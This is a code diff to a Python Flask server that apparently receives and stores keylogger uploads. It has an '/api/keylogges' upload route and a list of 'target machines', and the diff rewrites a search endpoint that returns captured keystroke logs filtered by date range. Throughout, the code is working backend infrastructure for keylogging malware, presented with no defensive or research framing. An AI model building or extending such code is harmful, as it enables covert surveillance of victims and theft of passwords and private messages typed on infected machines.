@@ -14,7 +14,7 @@ os.makedirs(DATA_FOLDER, exist_ok=True)
 
 @app.route('/')
 def home():
-    return render_template('main_page.html')
+    return render_template('Main_page1.html')
 
 @app.route('/api/keylogges', methods=['POST'])
 def upload():
@@ -65,7 +65,7 @@ def live_view():
 @app.route("/machines")
 def get_target_machines_list():
     machines = []
-    #data_folder = app.DATA_FOLDER
+    data_folder = DATA_FOLDER
     if not os.path.exists(DATA_FOLDER):
         return "No machines found"
 
@@ -186,34 +186,65 @@ def delete_month(machine, year, month):
         return True
     return False
 
-@app.route("/api/search", methods=["GET"])
-def collect_data(root, start, end):
-    result = []
-    machines_path = root
+DATA_ROOT = "data" 
 
-    for machine in os.listdir(machines_path):
-        for year in os.listdir(os.path.join(machines_path, machine)):
-            for month in os.listdir(os.path.join(machines_path, machine, year)):
-                month_folder = os.path.join(machines_path, machine, year, month)
-                if not os.path.isdir(month_folder): continue
+@app.route("/api/search/<start>/<end>", methods=["GET"])
+def collect_data(start, end):
+    try:
+        start_dt = datetime.fromisoformat(start)  # לדוגמה: 2024-01-01T00:00:00
+        end_dt = datetime.fromisoformat(end)
+    except ValueError:
+        return jsonify({"error": "Invalid date format. Use ISO format like 2024-01-01T00:00:00"}), 400
+
+    if not os.path.isdir(DATA_ROOT):
+        return jsonify({"error": f"Root path not found: {DATA_ROOT}"}), 404
+
+    result = []
+
+    for machine in os.listdir(DATA_ROOT):
+        machine_path = os.path.join(DATA_ROOT, machine)
+        if not os.path.isdir(machine_path):
+            continue
+
+        for year in os.listdir(machine_path):
+            year_path = os.path.join(machine_path, year)
+            if not os.path.isdir(year_path):
+                continue
+
+            for month in os.listdir(year_path):
+                month_folder = os.path.join(year_path, month)
+                if not os.path.isdir(month_folder):
+                    continue
 
                 for day_file in os.listdir(month_folder):
                     day_path = os.path.join(month_folder, day_file)
-                    if not os.path.isfile(day_path): continue
+                    if not os.path.isfile(day_path):
+                        continue
 
-                    try: file_date = datetime.strptime(day_file, "%Y-%m-%d")
-                    except: continue
+                    try:
+                        file_date = datetime.strptime(day_file, "%Y-%m-%d")
+                    except:
+                        continue
 
                     with open(day_path, encoding="utf-8") as f:
                         for line in f:
-                            if line.strip():
-                                try:
-                                    t_str, content = line.split("]",1)
-                                    t = datetime.strptime(t_str.strip("["), "%H:%M:%S")
-                                    dt = datetime(file_date.year,file_date.month,file_date.day,t.hour,t.minute,t.second)
-                                    if start <= dt <= end: result.append((machine, dt, content.strip()))
-                                except: pass
-    return sorted(result, key=lambda x: x[1])
+                            if not line.strip():
+                                continue
+                            try:
+                                t_str, content = line.split("]", 1)
+                                t = datetime.strptime(t_str.strip("["), "%H:%M:%S")
+                                dt = datetime(file_date.year, file_date.month, file_date.day,
+                                              t.hour, t.minute, t.second)
+                                if start_dt <= dt <= end_dt:
+                                    result.append({
+                                        "machine": machine,
+                                        "datetime": dt.isoformat(),
+                                        "content": content.strip()
+                                    })
+                            except:
+                                pass
+
+    return jsonify(sorted(result, key=lambda x: x["datetime"]))
 
 if __name__ == '__main__':
     app.run(debug=True)
